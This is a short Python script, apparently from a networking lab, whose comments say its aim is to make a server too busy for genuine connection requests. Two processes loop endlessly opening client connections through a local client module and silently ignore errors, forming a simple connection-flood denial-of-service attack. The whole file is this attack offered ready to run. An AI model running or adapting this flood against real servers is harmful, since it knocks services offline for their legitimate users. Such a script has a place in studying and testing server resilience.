# Just try soooo many connections that the server is too
# busy to respond to genuine connection requests

from multiprocessing import Pool, cpu_count, Process
import utils.client as c

def connect():
    # Continuously try to connect
    while True:
        cli = c.client()
        try:
            cli.init()
        except:
            pass

if __name__ == '__main__':
    # Turns out that only two are needed.
    for i in range(2):
        Process(target=connect, args=()).start()